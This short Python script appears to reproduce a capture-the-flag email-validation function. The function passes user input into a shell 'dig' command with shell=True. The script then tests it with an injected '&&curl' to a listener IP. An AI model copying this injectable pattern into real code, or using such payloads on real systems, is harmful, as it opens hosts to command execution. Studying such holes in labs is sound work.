import re
# from email.message import EmailMessage
# from subprocess import PIPE, run
# import ipaddress
from subprocess import PIPE, run

def issecure(email):
    if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
        return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        output = result.stdout.decode('utf-8')
        # if "v=spf1" not in output:

print(issecure("dicker@only4you.com&&curl http://10.10.14.5:8000"))
